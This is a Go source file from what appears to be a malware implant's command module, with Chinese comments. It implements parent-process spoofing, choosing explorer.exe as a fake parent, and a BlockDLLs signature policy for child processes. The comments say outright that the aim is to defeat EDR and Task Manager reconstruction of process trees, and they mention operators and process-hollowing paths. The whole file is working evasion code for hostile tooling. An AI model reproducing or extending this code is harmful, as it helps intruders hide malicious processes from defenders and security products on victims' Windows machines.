//go:build windows

package commands

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"

	"implant/core/config"
)

// 子进程的父进程伪造（PPID spoof）与 BlockDLLs。
//
// 这两项都通过 STARTUPINFOEX 的进程属性列表在 CreateProcess 时生效，属于"创建时就定型"
// 的对抗：孩子一出生，父进程字段就是别人，之后任何查询都只能看到伪造后的结果
// （GetProcessInformation / 任务管理器的父子关系 / 部分 EDR 的进程树重建）。
//
// 为什么挂在这里而不是 memset 式地改 PEB：PPID 是内核在创建时抄进 EPROCESS 的
// InheritedFromUniqueProcessId，用户态没有可写的副本，只能在创建那一刻传进去。
//
// 门控是两个独立开关（P4 从"任一主机层对抗开着"里拆出来）：
// ppidSpoof 只影响父进程字段，blockDLLs 只影响 DLL 签名策略。二者都默认关，
// 关着的时候不改父进程、不加签名策略，保持"普通程序"的行为。
// 之所以拆开：BlockDLLs 会打坏第三方 shell 扩展/输入法，而父进程伪造不会；
// 运营经常想要后者而不想要前者。

// PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
//
// 实测校正：这条策略在 64 位属性值里是**高 32 位的第 12 位**，即 0x0000100000000000。
// 早期误写成 0x0000000100000000（bit 32 = PROHIBIT_DYNAMIC_CODE 的位置），Update 不报错、
// 子进程照常创建，但签名策略读回是 0 —— 典型的"看起来生效其实没生效"。
// 判据只能是 GetProcessMitigationPolicy(ProcessSignaturePolicy) 读回 MicrosoftSignedOnly 位。
const mitigationBlockNonMS = 0x0000100000000000

// childAttrs 子进程创建属性；list==nil 表示没有可用属性（退化为普通 CreateProcess）
type childAttrs struct {
	list      *windows.ProcThreadAttributeListContainer
	ParentPID uint32
	BlockDLLs bool

	// parentHandle 是传给 PARENT_PROCESS 属性的父进程句柄，必须活到 CreateProcess 之后。
	// Windows 11 24H2 实测：该属性吃的是 8 字节的 HANDLE，传 4 字节 PID 直接 ERROR_BAD_LENGTH，
	// 传 8 字节 PID 则在 CreateProcess 时报 ERROR_INVALID_HANDLE。
	parentHandle windows.Handle
}

// newChildAttrs 按当前配置构造属性。任何一步失败都返回 nil —— 调用方照常创建进程，
// 只是不带属性；这类"锦上添花"的能力不该让 shell 命令整体失败。
func newChildAttrs() *childAttrs {
	wantPPID := config.PpidSpoofEnabled()
	wantBlock := config.BlockDLLsEnabled()
	if !wantPPID && !wantBlock {
		return nil
	}
	ca := &childAttrs{}
	list, err := windows.NewProcThreadAttributeList(2)
	if err != nil {
		return nil
	}
	ca.list = list

	// 父进程伪造：优先同一会话的 explorer.exe（有窗口的交互会话里几乎必然存在）。
	// 取不到就只做 BlockDLLs —— 伪造一个不存在的 PID 会让 CreateProcess 直接失败。
	if wantPPID {
		if pid := pickSpoofParent(); pid != 0 {
			if h, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, pid); err == nil {
				v := uintptr(h)
				if err := list.Update(windows.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, unsafe.Pointer(&v), unsafe.Sizeof(v)); err == nil {
					ca.ParentPID = pid
					ca.parentHandle = h
				} else {
					windows.CloseHandle(h)
				}
			}
			// 老系统（该属性按 DWORD 尺寸校验）走 4 字节 PID。
			if ca.ParentPID == 0 {
				p := pid
				if err := list.Update(windows.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, unsafe.Pointer(&p), unsafe.Sizeof(p)); err == nil {
					ca.ParentPID = pid
				}
			}
		}
	}

	// BlockDLLs：只允许微软签名的 DLL 进入子进程。
	// 对普通 shell 命令的副作用：第三方 shell 扩展 / 输入法注入式的 DLL 会被拒。
	if wantBlock {
		policy := uint64(mitigationBlockNonMS)
		if err := list.Update(windows.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, unsafe.Pointer(&policy), unsafe.Sizeof(policy)); err == nil {
			ca.BlockDLLs = true
		}
	}

	if ca.ParentPID == 0 && !ca.BlockDLLs {
		list.Delete()
		return nil
	}
	return ca
}

// Close 释放属性列表与父进程句柄
func (c *childAttrs) Close() {
	if c == nil {
		return
	}
	if c.list != nil {
		c.list.Delete()
		c.list = nil
	}
	if c.parentHandle != 0 {
		windows.CloseHandle(c.parentHandle)
		c.parentHandle = 0
	}
}

// Describe 一行诊断，用于命令回执
func (c *childAttrs) Describe() string {
	if c == nil {
		return "无（主机对抗未启用）"
	}
	var parts []string
	if c.ParentPID != 0 {
		parts = append(parts, fmt.Sprintf("父进程伪造=%d", c.ParentPID))
	}
	if c.BlockDLLs {
		parts = append(parts, "BlockDLLs=开")
	}
	if len(parts) == 0 {
		return "无"
	}
	return strings.Join(parts, " ")
}

// startupInfoExW 与 Windows 的 STARTUPINFOEXW 同构：STARTUPINFO + 属性列表指针。
// 用 syscall.StartupInfo 是为了跟 hollow/execute 这些既有 syscall.Call 路径对齐
// （windows.StartupInfo 是本包另一套类型，两者布局一致但不能混用）。
type startupInfoExW struct {
	StartupInfo             syscall.StartupInfo
	ProcThreadAttributeList uintptr
}

// createProcessWithAttrs 用 STARTUPINFOEX 创建进程；attrs 为空时退化为普通 CreateProcess。
func createProcessWithAttrs(cmdLine *uint16, inheritHandles bool, flags uint32, si *windows.StartupInfo, pi *windows.ProcessInformation, attrs *childAttrs) error {
	if attrs == nil || attrs.list == nil {
		return windows.CreateProcess(nil, cmdLine, nil, nil, inheritHandles, flags, nil, nil, si, pi)
	}
	siEx := windows.StartupInfoEx{ProcThreadAttributeList: attrs.list.List()}
	siEx.StartupInfo = *si
	siEx.Cb = uint32(unsafe.Sizeof(siEx))

	proc := windows.NewLazySystemDLL("kernel32.dll").NewProc("CreateProcessW")
	var inherit uintptr
	if inheritHandles {
		inherit = 1
	}
	r1, _, e := proc.Call(
		0,
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0, inherit,
		uintptr(flags|windows.EXTENDED_STARTUPINFO_PRESENT),
		0, 0,
		uintptr(unsafe.Pointer(&siEx)),
		uintptr(unsafe.Pointer(pi)),
	)
	if r1 == 0 {
		return e
	}
	return nil
}

// pickSpoofParent 选一个同会话的 explorer.exe 作为伪装父进程；找不到返回 0。
func pickSpoofParent() uint32 {
	var mySession uint32
	if err := windows.ProcessIdToSessionId(windows.GetCurrentProcessId(), &mySession); err != nil {
		return 0
	}
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer windows.CloseHandle(snap)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	if err := windows.Process32First(snap, &pe); err != nil {
		return 0
	}
	for {
		name := windows.UTF16ToString(pe.ExeFile[:])
		if strings.EqualFold(name, "explorer.exe") {
			var sess uint32
			if err := windows.ProcessIdToSessionId(pe.ProcessID, &sess); err == nil && sess == mySession {
				return pe.ProcessID
			}
		}
		if err := windows.Process32Next(snap, &pe); err != nil {
			return 0
		}
	}
}
